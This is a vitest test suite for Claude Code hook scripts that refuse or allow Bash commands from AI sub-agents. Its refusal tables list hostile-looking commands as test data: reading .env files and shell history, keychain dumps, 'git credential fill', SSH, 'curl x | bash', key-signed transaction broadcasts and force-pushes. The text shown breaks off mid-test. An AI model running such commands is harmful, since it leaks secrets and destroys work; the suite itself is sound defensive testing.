import { describe, it, expect, afterAll } from 'vitest'
import { spawnSync } from 'node:child_process'
import { mkdirSync, mkdtempSync, readFileSync, readdirSync, realpathSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import path from 'node:path'
import { fileURLToPath } from 'node:url'
import { decide as guardDecide, decideParsed, castAllowReason } from '../.claude/hooks/command-guard.mjs'
import { inspect, parseCommands, ParseError } from '../.claude/hooks/shell-parse.mjs'
import { rawScan, normalise, loneCommitRemainder, isPureReader, LAYER0_RULES } from '../.claude/hooks/raw-scan.mjs'

const ROOT = path.join(path.dirname(fileURLToPath(import.meta.url)), '..')
const HOOK = path.join(ROOT, '.claude', 'hooks', 'readonly-guard.mjs')
const AGENTS = path.join(ROOT, '.claude', 'agents')

// Two real directories for the read-only guard's "where does it run" rule (A77d H-11): a MAIN checkout (`.git` is a
// directory) and a LINKED worktree (`.git` is a file). Hermetic: the answer must not depend on which checkout runs the suite.
function safeTempDir() { // the random part must not spell a word layer 0 refuses (ssh, scp, pm2, env ...), or a path would trip a guard
  for (;;) {
    const d = realpathSync(mkdtempSync(path.join(tmpdir(), 'ro-guard-')))
    if (!/ssh|scp|sftp|pm2|security|history|env|claude|auth|gh|cast|push/i.test(path.basename(d))) return d
    rmSync(d, { recursive: true, force: true })
  }
}
const FIXTURE = safeTempDir()
const MAIN = path.join(FIXTURE, 'main')
const WT = path.join(FIXTURE, 'wt')
mkdirSync(path.join(MAIN, '.git'), { recursive: true })
mkdirSync(path.join(MAIN, 'src'))
mkdirSync(path.join(WT, 'src'), { recursive: true })
writeFileSync(path.join(WT, '.git'), `gitdir: ${MAIN}/.git/worktrees/wt\n`)
afterAll(() => rmSync(FIXTURE, { recursive: true, force: true }))

// Read-only agents (recon, auditor): everything the settings.json hook keyed on agent_type must refuse / allow.
const RO_REFUSED = [
  'git commit -m x', 'git commit -S --amend', 'git push origin x', 'git push', 'git -C /tmp/wt push origin x', 'git -c user.name=x commit -m y', 'cd wt && git push', 'echo ok; git push',
  'sh -c "git push origin x"', "bash -lc 'git commit -m x'", 'eval "git push"', 'FOO=1 git commit -m x', '/usr/bin/git push', 'env git push', 'command git push', '\\git push', '"git" push', 'GIT push', 'xargs git push', 'echo $(git push)',
  'git pull', 'git pull --rebase origin main', 'git -C wt pull', 'git am x.patch', 'git cherry-pick abc', 'git rebase origin/main', 'git revert HEAD', 'git tag v1', 'git tag -a v1 -m x', 'git config user.name x', 'git config --global alias.p push',
  'git clean -fd', 'git clean -n', 'git restore file', 'git restore --staged file', 'git reset --hard', 'git stash', 'git apply x.patch', 'git add .', 'git rm file', 'git mv a b', 'git gc', 'git filter-branch', 'git init',
  'git merge origin/main', 'git merge --continue', 'git merge --commit --no-commit x',
  'git checkout -b x', 'git checkout -B x origin/main', 'git checkout -fb x', 'git checkout --orphan x', 'git checkout -- file', 'git switch -c x', 'git switch -C x', 'git switch --create x',
  'git fetch origin a:b', 'git fetch origin +refs/heads/*:refs/remotes/o/*', 'git fetch origin pull/5/head:pr-5', 'git fetch --depth 1 origin a:b', 'git -C wt fetch origin main:main',
  'git branch x', 'git branch -D x', 'git branch -m a b', 'git branch -c a b', 'git branch --delete x', 'git branch -u origin/main', 'git remote add x y', 'git remote remove x', 'git remote set-url origin x', 'git reflog expire --all', 'git update-ref -d refs/x',
  'gh pr create --title x', 'gh pr merge 5', 'gh pr comment 5 -b x', 'gh pr edit 5', 'gh pr close 5', 'gh -R a/b pr close 5', 'gh issue create', 'gh issue comment 5', 'gh release create v1', 'gh workflow run x', 'gh run download 5', 'gh run rerun 5', 'gh repo delete a/b', 'gh repo clone a/b', 'gh auth login', 'gh alias set x y', 'gh gist create f',
  'gh api -X POST repos/a/b/issues', 'gh api -XPOST x', 'gh api repos/a/b --method=DELETE', 'gh api repos/a/b/issues -f title=x', 'gh api repos/a/b/issues -ftitle=x', 'gh api x -Fn=1', 'gh api x --field=a=b', 'gh api x --input=f', 'gh api -iX PATCH x',
  'bash', 'echo x | sh', 'eval "$CMD"',
  // A77c H-11 / M-11: read-only git cannot move refs or change the repository's shape
  'git merge --no-commit origin/main', 'git merge --no-commit --ff-only origin/main', 'git merge --no-commit --ff origin/main', 'git merge --ff-only origin/main', 'git worktree add ../zz', 'git worktree add /tmp/w origin/main', 'git worktree add -f /tmp/w',
  'git fetch --depth 1', 'git fetch --depth=1 origin main', 'git fetch --deepen 5', 'git fetch --deepen=5', 'git fetch --shallow-since=2020-01-01', 'git fetch --shallow-exclude=x', 'git fetch --unshallow', 'git fetch --prune', 'git fetch -p', 'git fetch --prune-tags',
  'git fetch origin main:main', 'git fetch origin +main', 'gh pr checkout 5', 'gh -R a/b pr checkout 5', 'gh pr checkout 5 --detach',
]
const RO_ALLOWED = [
  'git status', 'git log --oneline -5', 'git diff origin/main...HEAD --stat', 'git fetch origin main', 'git fetch origin', 'git fetch --all --tags', 'git fetch origin pull/5/head', 'git worktree add --detach /tmp/wt origin/main', 'git worktree add --detach /tmp/wt',
  'git worktree remove /tmp/wt', 'git worktree remove --force /tmp/wt', 'git worktree list', 'git -C /tmp/wt rev-parse HEAD', 'git show HEAD:package.json', 'git branch --show-current', 'git branch -a', 'git branch -r --contains abc', 'git branch --list "chore/*"',
  'git remote -v', 'git log -1 --format=%H', 'git merge --no-commit --no-ff origin/main', 'git merge --no-commit --no-ff x', 'git merge --abort', 'git merge --quit', 'git checkout --detach origin/main',
  'git merge-base HEAD origin/main', 'git merge-base --is-ancestor a b', 'git rev-list --count HEAD', 'git rev-list origin/main..HEAD', 'git name-rev HEAD', 'git shortlog -sn HEAD', 'git for-each-ref --format=%(refname) refs/heads', 'git show-ref', 'git show-ref --heads', 'git diff-tree --no-commit-id --name-only -r HEAD', 'git status -sb',
  'git ls-files', 'git blame -L1,5 file', 'git grep -n "git push" docs', 'git config --get remote.origin.url', 'git tag -l "v*"', 'git describe --tags',
  'npm ci', 'npm test', 'npx tsc --noEmit', 'npx --no-install vitest run',
  'gh pr view 5 --json state', 'gh pr diff 5', 'gh pr list', 'gh pr status', 'gh pr checks 5', 'gh -R a/b pr checks 5', 'gh --repo a/b pr view 5', 'gh api repos/a/b/pulls/5', 'gh api repos/a/b/pulls?per_page=5', 'gh api repos/a/b', 'gh api repos/a/b -H "Accept: x" --jq .name',
  'gh issue view 5', 'gh issue list', 'gh repo view', 'gh run view 5', 'gh run list', 'gh --version', 'gh',
  'grep -rn "git push" docs', "grep -rn 'git push origin' docs", 'rg "gh pr view" docs', 'git log --grep="git commit"', 'echo "git push"', 'echo "do not git commit here" | cat', 'git log --oneline | grep "git push"', 'ls -la', 'cat package.json',
]

const { decide: roDecide, isReadOnlyAgent, checkoutKind, startDir } = await import('../.claude/hooks/readonly-guard.mjs')

describe('readonly-guard decide() — refused', () => {
  for (const c of RO_REFUSED) it(`refuses: ${JSON.stringify(c)}`, () => expect(roDecide(c, { cwd: WT }), c).toEqual(expect.any(String)))
})
describe('readonly-guard decide() — allowed (a quoted "git push" is not a push)', () => {
  for (const c of RO_ALLOWED) it(`allows: ${JSON.stringify(c)}`, () => expect(roDecide(c, { cwd: WT }), c).toBeNull())
})

// A77d H-11: `checkout --detach`, `merge` and `worktree remove --force` change the checkout they run in. hookExit() is
// defined further down (function declaration, hoisted); every case runs through the decision AND the wired hook.
const H11_FORMS = ['git checkout --detach origin/main', 'git merge --no-commit --no-ff origin/main', 'git worktree remove --force /tmp/ro-guard-x']
const inDir = (c, dir) => c.replace(/^git /, `git -C ${dir} `)
describe('A77d H-11 — read-only git respects where it runs', () => {
  for (const c of H11_FORMS) {
    describe(c, () => {
      it('refused with the hook cwd = the main checkout (and a subdirectory of it)', () => {
        for (const cwd of [MAIN, path.join(MAIN, 'src')]) {
          expect(roDecide(c, { cwd }), `${cwd}: ${c}`).toMatch(/MAIN checkout/)
          for (const agent of ['recon', 'auditor']) expect(hookExit(c, agent, cwd), `${agent} ${cwd}`).toBe(2)
        }
      })
      it('refused with `cd MAIN &&` in front, from a linked worktree', () => {
        expect(roDecide(`cd ${MAIN} && ${c}`, { cwd: WT }), c).toMatch(/MAIN checkout/)
        expect(hookExit(`cd ${MAIN} && ${c}`, 'recon', WT)).toBe(2)
      })
      it('refused with `git -C MAIN`, from a linked worktree', () => {
        expect(roDecide(inDir(c, MAIN), { cwd: WT }), c).toMatch(/MAIN checkout/)
        expect(hookExit(inDir(c, MAIN), 'auditor', WT)).toBe(2)
      })
      it('allowed with the hook cwd = a linked worktree (and a subdirectory of it)', () => {
        for (const cwd of [WT, path.join(WT, 'src')]) {
          expect(roDecide(c, { cwd }), `${cwd}: ${c}`).toBeNull()
          for (const agent of ['recon', 'auditor']) expect(hookExit(c, agent, cwd), `${agent} ${cwd}`).toBe(0)
        }
      })
      it('allowed with `cd WORKTREE &&` and with `git -C WORKTREE`, even when the hook cwd is the main checkout', () => {
        expect(roDecide(`cd ${WT} && ${c}`, { cwd: MAIN }), c).toBeNull()
        expect(roDecide(inDir(c, WT), { cwd: MAIN }), c).toBeNull()
        expect(hookExit(`cd ${WT} && ${c}`, 'recon', MAIN)).toBe(0)
        expect(hookExit(inDir(c, WT), 'auditor', MAIN)).toBe(0)
      })
      it('the implementer and the main session are not read-only: allowed in the main checkout', () => {
        for (const agent of [undefined, 'implementer']) expect(hookExit(c, agent, MAIN), String(agent)).toBe(0)
      })
    })
  }
  it('merge --abort / --quit, fetch, `worktree add --detach` and `worktree remove` (no --force) stay allowed in the main checkout', () => {
    for (const c of ['git merge --abort', 'git merge --quit', 'git fetch origin main', 'git fetch --all --tags', 'git worktree add --detach /tmp/ro-guard-w origin/main', 'git worktree remove /tmp/ro-guard-x', 'git status']) {
      expect(roDecide(c, { cwd: MAIN }), c).toBeNull()
      expect(hookExit(c, 'recon', MAIN), c).toBe(0)
    }
  })
  it('the other merge forms stay refused everywhere (any form but --abort/--quit changes the checkout)', () => {
    for (const c of ['git merge origin/main', 'git merge --no-commit origin/main', 'git merge --ff-only origin/main']) {
      for (const cwd of [MAIN, WT]) expect(roDecide(c, { cwd }), `${cwd}: ${c}`).toEqual(expect.any(String))
    }
  })
  it('an undeterminable directory is refused (fail closed): no cwd, a variable, a cd that is not a leading `&&`, env -C, GIT_DIR, --git-dir', () => {
    const c = H11_FORMS[1]
    expect(roDecide(c), 'no cwd').toMatch(/cannot be determined/)
    expect(roDecide(c, { cwd: 'relative/dir' }), 'relative cwd').toMatch(/cannot be determined/)
    for (const x of [`cd $D && ${c}`, `(cd ${WT}); ${c}`, `cd ${WT}; ${c}`, `cd ${WT} || cd ${MAIN}; ${c}`, `sh -c "cd ${WT} && ${c}"`, `env -C ${WT} ${c}`, `GIT_DIR=${WT}/.git ${c}`, `GIT_WORK_TREE=${WT} ${c}`,
      c.replace('git ', `git --git-dir=${WT}/.git `), c.replace('git ', `git --work-tree ${WT} `), `git -C $D merge --no-commit --no-ff x`]) {
      expect(roDecide(x, { cwd: WT }), x).toMatch(/cannot be determined|--git-dir/)
    }
  })
  it('-C is cumulative and relative to the hook cwd; a directory without `.git` above it is not a linked worktree', () => {
    expect(roDecide(`git -C src ${H11_FORMS[0].slice(4)}`, { cwd: MAIN }), 'relative -C into main').toMatch(/MAIN checkout/)
    expect(roDecide(`cd ${WT} && cd ${MAIN} && ${H11_FORMS[1]}`, { cwd: WT }), 'two leading cds resolve in order').toMatch(/MAIN checkout/)
    expect(roDecide(`git -C ${FIXTURE} -C wt ${H11_FORMS[0].slice(4)}`, { cwd: MAIN }), '-C a -C b').toBeNull()
    expect(roDecide(`git -C /nonexistent-ro-guard ${H11_FORMS[0].slice(4)}`, { cwd: WT }), 'no .git above').toMatch(/not a linked worktree/)
  })
  it('checkoutKind: `.git` directory = main, `.git` file = linked, nothing = unknown', () => {
    expect(checkoutKind(MAIN)).toBe('main')
    expect(checkoutKind(path.join(MAIN, 'src'))).toBe('main')
    expect(checkoutKind(WT)).toBe('linked')
    expect(checkoutKind(path.join(WT, 'src'))).toBe('linked')
    expect(checkoutKind(path.join(WT, 'not-created-yet'))).toBe('linked')
    expect(checkoutKind('relative')).toBe('unknown')
    expect(checkoutKind(undefined)).toBe('unknown')
  })
  it('startDir applies only leading `cd DIR &&`', () => {
    const cmds = (c) => inspect(c).cmds
    const one = (c) => startDir(c, cmds(c), '/base')
    expect(one('git status')).toBe('/base')
    expect(one('cd /a && cd b && git status')).toBe('/a/b')
    expect(one('cd "/a b" && git status')).toBe('/a b')
    expect(one('cd /a; git status')).toBeNull()
    expect(one('git status && cd /a')).toBeNull()
  })
})

describe('readonly-guard decide() — every allowed row also passes BOTH wired hooks (A77d: three rows used to be refused by command-guard)', () => {
  for (const c of RO_ALLOWED) it(`exit 0 for recon: ${JSON.stringify(c)}`, () => expect(hookExit(c, 'recon', WT), c).toBe(0))
})

describe('readonly-guard keyed on agent_type', () => {
  it('recon and auditor (also namespaced / cased) are read-only; everything else is not', () => {
    for (const t of ['recon', 'auditor', 'Recon', 'project:auditor', ' auditor ']) expect(isReadOnlyAgent(t), t).toBe(true)
    for (const t of ['implementer', 'Explore', 'general-purpose', 'reconnaissance', '', undefined, null, 5]) expect(isReadOnlyAgent(t), String(t)).toBe(false)
  })
})

describe('readonly-guard process protocol', () => {
  const run = (stdin) => spawnSync('node', [HOOK], { input: stdin, encoding: 'utf8' })
  const call = (command, agent_type) => JSON.stringify({ tool_name: 'Bash', tool_input: { command }, ...(agent_type === undefined ? {} : { agent_type }) })
  it('blocks (exit 2 + stderr) a write for recon and auditor', () => {
    for (const agent of ['recon', 'auditor']) {
      const r = run(call('git pull', agent))
      expect(r.status, agent).toBe(2)
      expect(r.stderr).toContain('readonly-guard: refused')
    }
  })
  it('lets the same command through for the implementer and for the main session (no agent_type)', () => {
    expect(run(call('git pull', 'implementer')).status).toBe(0)
    expect(run(call('git pull')).status).toBe(0)
    expect(run(call('git push -u origin x', undefined)).status).toBe(0)
  })
  it('exit 0 on an allowed command for a read-only agent', () => {
    expect(run(call('git status', 'auditor')).status).toBe(0)
    expect(run(call('grep -rn "git push" docs', 'recon')).status).toBe(0)
  })
  it('a hook error blocks: bad JSON, missing command, unterminated quote (command-guard covers non-read-only agents)', () => {
    for (const stdin of ['not json', '', JSON.stringify({ tool_input: {} }), call('echo "x', 'recon'), call("echo 'x", 'auditor'), call('echo $(git', 'recon')]) {
      const r = run(stdin)
      expect(r.status, stdin).toBe(2)
      expect(r.stderr).toContain('failing closed')
    }
  })
  it('settings.json registers it on Bash for every session, wrapped so a crash blocks', () => {
    const s = JSON.parse(readFileSync(path.join(ROOT, '.claude', 'settings.json'), 'utf8'))
    const hooks = s.hooks.PreToolUse.filter((e) => e.matcher === 'Bash').flatMap((e) => e.hooks)
    const h = hooks.find((x) => x.command.includes('readonly-guard.mjs'))
    expect(h, 'readonly-guard wired in settings.json').toBeTruthy()
    expect(h.command).toMatch(/\|\| exit 2$/)
    expect(h.onFailure).toBe('block')
  })
})

function frontmatter(file) {
  const text = readFileSync(file, 'utf8')
  const m = /^---\n([\s\S]*?)\n---\n/.exec(text)
  if (!m) throw new Error(`${file}: no frontmatter`)
  return { fm: m[1], body: text.slice(m[0].length) }
}
const field = (fm, key) => (new RegExp(`^${key}:\\s*(.*)$`, 'm').exec(fm) || [])[1]?.trim()

describe('.claude/agents', () => {
  const files = readdirSync(AGENTS).filter((f) => f.endsWith('.md')).sort()
  it('ships exactly implementer, recon, auditor', () => {
    expect(files).toEqual(['auditor.md', 'implementer.md', 'recon.md'])
  })

  const spec = {
    implementer: { model: 'sonnet' },
    recon: { model: 'haiku' },
    auditor: { model: 'opus' },
  }
  for (const [name, { model }] of Object.entries(spec)) {
    describe(name, () => {
      const { fm, body } = frontmatter(path.join(AGENTS, `${name}.md`))
      it('has name, description, model, tools', () => {
        expect(field(fm, 'name')).toBe(name)
        expect(field(fm, 'description')).toBeTruthy()
        expect(field(fm, 'model')).toBe(model)
        expect(field(fm, 'tools')).toBeTruthy()
      })
      it('carries the standing rules in the body', () => {
        for (const needle of ['worktree', 'npm ci', 'SSH-signed', 'noreply', 'force-push', 'premise', 'Exit =']) {
          expect(body, `${name} missing "${needle}"`).toContain(needle)
        }
        expect(body).toMatch(/NO CI polling/)
        expect(body).toMatch(/never (open|merge)[^\n]*PR|PR[^\n]*never/i)
      })
    })
  }

  for (const name of ['recon', 'auditor']) {
    it(`${name}: no Edit/Write/NotebookEdit in tools, and no frontmatter hook (the guard is in settings.json)`, () => {
      const { fm } = frontmatter(path.join(AGENTS, `${name}.md`))
      const tools = field(fm, 'tools').split(/[,\s]+/).filter(Boolean)
      for (const t of ['Edit', 'Write', 'NotebookEdit']) expect(tools, `${name} tools`).not.toContain(t)
      expect(fm).toContain('disallowedTools')
      expect(fm, 'MultiEdit is not a tool (A77): do not list it').not.toContain('MultiEdit')
      // A77 M-1: the guard lives in settings.json keyed on agent_type, not in frontmatter (skipped without workspace trust)
      expect(fm).not.toMatch(/hooks:|PreToolUse|readonly-guard/)
    })
  }

  it('implementer has Edit and Write and no hook that blocks commits', () => {
    const { fm } = frontmatter(path.join(AGENTS, 'implementer.md'))
    const tools = field(fm, 'tools').split(/[,\s]+/)
    expect(tools).toEqual(expect.arrayContaining(['Edit', 'Write', 'Bash']))
    expect(fm).not.toContain('readonly-guard')
  })

  it('auditor body fixes the verdict line and the report-is-the-exit clause', () => {
    const { body } = frontmatter(path.join(AGENTS, 'auditor.md'))
    expect(body).toContain('VERDICT: 0C/0H → approved')
    expect(body).toContain('VERDICT: blocked — nC/nH')
    expect(body).toContain('ANY verdict')
    expect(body).toMatch(/[Dd]etached worktree/)
  })
})

// ---------------------------------------------------------------------------------------------------------------
// command-guard (settings-level, every agent): Table A = spellings that MUST be refused, Table B = actions that MUST
// stay allowed. Table A is reconstructed from audit A77 (H-1..H-3) as listed in the goal: the owner's original
// "Not denied" table was not available in the session, so each family below enumerates the spellings the audit named
// (absolute path, env/command/VAR=x wrappers, quoting, backslashes, sh -c / eval, combined short flags, +refspec,
// attached flag values, flags in any position) plus the obvious neighbours.
export const TABLE_A = {
  'ssh / scp / sftp / ssh-add / rsync-over-ssh': [
    'ssh host', 'ssh -V', '/usr/bin/ssh host', 'env ssh host', 'command ssh host', 'FOO=1 ssh host', '"ssh" host', "'ssh' host",
    's\\sh host', 'SSH host', './node_modules/.bin/ssh host', 'npx ssh host', 'sh -c "ssh host"', "bash -lc 'ssh host'", 'zsh -c "ssh host"',
    'eval "ssh host"', 'echo hi | ssh host', 'cd x && ssh host', 'ls; ssh host', 'ls\nssh host', 'echo $(ssh host)', 'echo `ssh host`',
    'xargs ssh', 'xargs -n1 ssh', 'sudo ssh host', 'timeout 5 ssh host', 'nohup ssh host', 'env -S "ssh host"', "env -i HOME=/ ssh host",
    'find . -exec ssh host {} ;', 'scp a.txt host:/tmp', '/usr/bin/scp a h:b', 'sftp host', 'ssh-add -l', '/usr/bin/ssh-add',
    'rsync -e ssh a host:b', 'rsync -avze ssh a b', 'rsync --rsh=ssh a b', 'rsync -a a user@host:/b', 'rsync -a host:/b a', 'rsync rsync://h/m a',
  ],
  pm2: ['pm2 list', 'pm2', '/opt/homebrew/bin/pm2 restart x', 'npx pm2 list', 'env pm2 ls', 'echo a && pm2 ls', 'sh -c "pm2 ls"', 'PM2 ls'],
  'keychain security': ['security find-generic-password -s x', '/usr/bin/security dump-keychain', 'command security list-keychains', 'env security', 'sh -c "security find-internet-password"'],
  'cast / forge broadcast': [
    'cast send 0x0 "f()"', 'cast send --rpc-url x --private-key k 0x0', 'cast --rpc-url x send 0x0', 'cast 0x0 send', 'cast publish 0xraw', 'cast s 0x0 "f()"',
    'cast rpc eth_sendRawTransaction 0xab', '/usr/local/bin/cast send 0x0', 'env cast send 0x0', 'sh -c "cast send 0x0"', 'forge script S.s.sol --broadcast',
    'forge script --rpc-url x --broadcast S.s.sol', 'forge script S.s.sol --rpc-url x --broadcast --verify', 'forge script S --broadcast=true', 'forge create X --broadcast', 'forge script S --resume',
  ],
  'git push: force': [
    'git push --force', 'git push -f', 'git push origin x -f', 'git push -f origin x', 'git push -uf origin x', 'git push -fu origin x', 'git push -nf origin x', 'git push --force-with-lease',
    'git push origin x --force-with-lease', 'git push --force-with-lease=main:abc123', 'git push --force-if-includes', 'git push --forc', 'git push --force-w', 'git push origin +x',
    'git push origin "+x"', "git push origin '+x'", 'git push origin \\+x', 'git push origin HEAD:+x', 'git push origin +HEAD:x', 'git push --mirror', 'git push -f --no-verify',
    'git -C . push --force', 'git -C . push -f origin x', 'git -c user.name=x push -f', 'git --no-pager push -f', '/usr/bin/git push -f', 'env git push -f', 'FOO=1 git push -f',
    'command git push -f', 'GIT push -f', '\\git push -f', '"git" push -f', 'cd x && git push -f', 'echo a; git push -f', 'git status\ngit push -f', 'sh -c "git push -f"', 'bash -c "git push --force"',
    "bash -c 'git push origin +x'", 'eval "git push -f"', 'echo $(git push -f)', 'echo `git push -f`', 'xargs git push -f', 'sudo git push -f', 'git push $FLAG origin x', 'git push origin $BR',
    'git push origin HEAD:$BR', 'git push "$(echo --force)"', 'git -c push.default=current push -f',
  ],
  'git push: remote delete': ['git push --delete origin x', 'git push origin --delete x', 'git push origin :x', 'git push origin ":x"', "git push origin ':refs/heads/x'", 'git push -d origin x', 'git push --del origin x', 'git push --prune origin "refs/heads/*"', 'git -C . push origin :x', 'sh -c "git push origin :x"'],
  'git credential / alias injection': ['git credential fill', 'git -C . credential approve', 'git -c credential.helper=x push origin x', 'git -c alias.p=push p', 'git -c core.sshCommand=x fetch', 'git -c remote.origin.push=+x push'],
  'gh pr (all but view diff checks list status)': [
    'gh pr create', 'gh pr create --title x', 'gh pr merge 5', 'gh pr merge 5 --squash', 'gh pr ready 5', 'gh pr close 5', 'gh pr reopen 5', 'gh pr comment 5 -b x', 'gh pr edit 5', 'gh pr review 5 --approve',
    'gh pr update-branch 5', 'gh pr lock 5', 'gh -R a/b pr create', 'gh --repo a/b pr merge 5', 'gh pr -R a/b merge 5', 'gh pr --repo=a/b close 5', '/opt/homebrew/bin/gh pr create',
    'env gh pr create', 'command gh pr create', 'GH_TOKEN=x gh pr create', 'GH pr create', 'cd x && gh pr create', 'sh -c "gh pr create"', 'eval "gh pr merge 5"', 'xargs gh pr close', 'gh alias set mk "pr create"', 'gh codespace ssh',
  ],
  'gh api (anything not provably GET)': [
    'gh api -X POST repos/a/b/issues', 'gh api -XPOST repos/a/b/issues', 'gh api -X=POST x', 'gh api repos/a/b -X DELETE', 'gh api --method POST x', 'gh api --method=PATCH x', 'gh api x --method PUT',
    'gh api -X GET repos/a/b -f a=b', 'gh api repos/a/b/issues -f title=x', 'gh api repos/a/b/issues -ftitle=x', 'gh api x -F n=1', 'gh api x -Fn=@f', 'gh api x --field a=b', 'gh api x --field=a=b',
    'gh api x --raw-field a=b', 'gh api x --raw-field=a=b', 'gh api --input f x', 'gh api x --input=f', 'gh api x --input -', 'gh api -H "Accept: x" x -f a=b', 'gh api -iX POST x', 'gh api -ifa=b x',
    'gh api graphql -f query=mutation', 'gh api graphql -F query=@q.graphql', 'gh -R a/b api -X POST x', '/opt/homebrew/bin/gh api -X POST x', 'env gh api -X DELETE x', 'sh -c "gh api -X POST x"',
    'gh api x --method delete', 'gh api x -x post',
  ].filter((c) => !c.endsWith('-x post')),
  'npm audit fix': ['npm audit fix', 'npm audit fix --force', 'npm audit --fix', 'npm audit --json fix', 'npm audit --fix --force', 'npm --silent audit fix', 'npm audit --omit=dev --fix', 'npm audit --fix=true', 'npx npm audit fix', 'pnpm audit --fix', 'env npm audit fix', 'sh -c "npm audit fix"', '/usr/local/bin/npm audit fix'],
  '.env files': [
    'cat .env', 'cat ./.env', 'cat /abs/path/.env', 'cat "$PWD/.env"', 'cat .env.local', 'cat .env.production', 'cat .env.canary', 'head -1 .ENV', 'cp .env /tmp/x', 'source .env', '. .env', 'less < .env', 'cat <.env',
    'node --env-file=.env x.js', 'tail -n1 .env*', 'cat .e*', 'grep KEY .env', 'sed -n 1p .env', 'bash -c "cat .env"', 'xargs cat < .env', 'git add .env', 'cat ".env"', "cat '.env'", 'cat \\.env', 'c\\at .env',
    'echo x > .env', 'echo x >> .env.local', 'tee .env', 'cat apps/web/.env', 'env cat .env', 'sh -c "source .env"', 'cat $(echo a) .env', 'git commit -F .env', 'grep -f .env x',
  ],
  'history': ['history', 'history 50', 'builtin history', 'command history', 'fc -l', 'fc -ln -1', 'cat ~/.zsh_history', 'tail ~/.bash_history', 'grep x ~/.zhistory', 'less ~/.local/share/fish/fish_history', 'cat $HOME/.zsh_history', 'cat ~/.python_history', 'ls ~/.zsh_sessions', 'sh -c "history"', 'echo a | history'],
  'bare shell / uninspectable': ['bash', 'sh', 'echo "ssh host" | sh', 'echo x | bash -s', 'bash <<EOF\nssh host\nEOF', 'eval "$CMD"', 'sh -c "$CMD"', '$CMD push', 'curl x | bash'],
}

export const TABLE_B = [
  'git status', 'git log --oneline -5', 'git diff origin/main...HEAD --stat', 'git show HEAD:package.json', 'git remote -v', 'git branch --show-current', 'git fetch origin main', 'git worktree add --detach /tmp/wt origin/main',
  'git commit -m "msg"', 'git commit -S -m "x"', 'git commit -am "x"', 'git commit -m "docs: mention push --force, ssh, pm2, cast send and .env handling"', 'git commit -m "git push --force"',
  'git commit -m "fix: history of ~/.zsh_history and gh pr create"', "git commit -m 'cat .env'", 'git commit -m ".env"', 'git commit --message=".env"',
  'git commit -m "$(cat <<\'EOF\'\nfeat: x\n\nssh host; git push --force; cat .env; gh pr create\n\nCo-Authored-By: Claude\nEOF\n)"',
  'git commit -S -m "x" && git push -u origin chore/agent-harness',
  'git push', 'git push -u origin chore/agent-harness', 'git push origin chore/agent-fix', 'git push origin chore/force-field-copy', 'git push origin HEAD:refs/heads/chore/x', 'git -C . push origin x', 'git push --set-upstream origin x',
  'git push --no-verify origin x', 'git push --dry-run origin x', 'git push -n origin x', 'git push --follow-tags', 'git push -o ci.skip origin x', 'git push origin x 2>&1 | tail -3', 'git push origin refs/heads/x:refs/heads/x',
  'grep -rn "git push" docs', "grep -rn 'git push origin' docs", 'grep -n "keygen" README.md', 'grep -rn "environment" src', 'grep -n "dotenv" scripts/x.sh', 'grep -rn ".env.example" docs', 'rg "env.example" docs', 'rg -e dotenv docs',
  'git log --grep="environment"', 'git grep -n "git push" -- docs', 'grep -rn "cast call" docs', 'grep -rn "gh pr view" docs', 'grep -c "history" docs/x.md', 'echo "git push"',
  'cat .env.example', 'cat ./.env.example', 'ls -la', 'ls *', 'ls -a', 'ls .env.example', 'cat package.json', 'sed -n "1,5p" file', 'ls docs/signing', 'npm view ssh2 version', 'command -v node', 'which node', 'cat docs/security/AUDIT-TOTAL.md', 'ls docs/security', 'git merge-base HEAD origin/main', 'git rev-list --count HEAD', 'cat src/env.ts',
  'npm ci', 'npm test', 'npm run build', 'npm run lint', 'npm audit', 'npm audit --json', 'npm audit --omit=dev', 'npm run audit:fix-report', 'npx tsc --noEmit', 'npx --no-install vitest run', './node_modules/.bin/vitest run', 'FOO=1 npm test',
  'env FOO=1 npm test', 'cd x && npm test', 'timeout 60 npm test', 'echo hi | cat', 'xargs echo', 'find . -name "*.ts"', 'node scripts/goal-lint.mjs goal.md', 'bash scripts/agent-verify.sh', 'bash -c "echo hi"', 'sh -c "git status"', 'eval "git status"',
  'bash -lc "npm test"', 'diff <(git show a:f) <(git show b:f)', 'echo "$(git rev-parse HEAD)"', 'git diff --stat 2>&1 | tail', 'rsync -a src/ dst/', 'rsync -a ./a ./b',
  'gh pr view 5', 'gh pr view 5 --json state', 'gh pr diff 5', 'gh pr checks 5', 'gh pr checkout 5', 'gh pr list', 'gh pr list --state merged', 'gh pr status', 'gh -R a/b pr view 5', 'gh --repo a/b pr checks 5',
  'gh api repos/a/b/pulls/5', 'gh api repos/a/b/pulls?per_page=5', 'gh api repos/a/b/contents/foo-Xbar', 'gh api repos/a/b/contents/x-f', 'gh api repos/a/b',
  'gh api repos/a/b -H "Accept: application/vnd.github+json"', 'gh api repos/a/b --jq ".name"', 'gh api repos/a/b -q .name', 'gh api repos/a/b/commits --paginate', 'gh api -H "X-Foo: bar" repos/a/b', 'gh issue view 5', 'gh pr view 5 --json state,reviewDecision',
  'forge test', 'forge build', 'forge script S.s.sol --rpc-url x', 'forge fmt --check', 'cast call 0x0 "f()"', 'cast block-number', 'cast --version', 'cast sig "transfer(address)"',
  'for f in a b; do echo $f; done', 'if true; then echo ok; fi', '# git push', 'echo ok # note', 'git commit -m "x" # note',
]

describe('command-guard decide() — Table A (refused)', () => {
  for (const [family, cmds] of Object.entries(TABLE_A)) {
    describe(family, () => {
      for (const c of cmds) it(`refuses: ${JSON.stringify(c)}`, () => expect(guardDecide(c), c).toEqual(expect.any(String)))
    })
  }
})

describe('command-guard decide() — Table B (allowed)', () => {
  for (const c of TABLE_B) it(`allows: ${JSON.stringify(c)}`, () => expect(guardDecide(c), c).toBeNull())
})

describe('command-guard process protocol (fails closed)', () => {
  const GUARD = path.join(ROOT, '.claude', 'hooks', 'command-guard.mjs')
  const run = (stdin) => spawnSync('node', [GUARD], { input: stdin, encoding: 'utf8' })
  const bash = (command) => JSON.stringify({ tool_name: 'Bash', tool_input: { command } })
  it('exit 2 + stderr on a refused command', () => {
    const r = run(bash('git push -uf origin x'))
    expect(r.status).toBe(2)
    expect(r.stderr).toContain('command-guard: refused')
  })
  it('exit 0 on an allowed command', () => expect(run(bash('git status')).status).toBe(0))
  it('a hook error blocks: bad JSON, missing command, unterminated quote, empty stdin', () => {
    for (const stdin of ['not json', '', JSON.stringify({ tool_input: {} }), JSON.stringify({ tool_input: { command: 5 } }), bash('echo "unterminated'), bash("echo 'x"), bash('echo $(date')]) {
      const r = run(stdin)
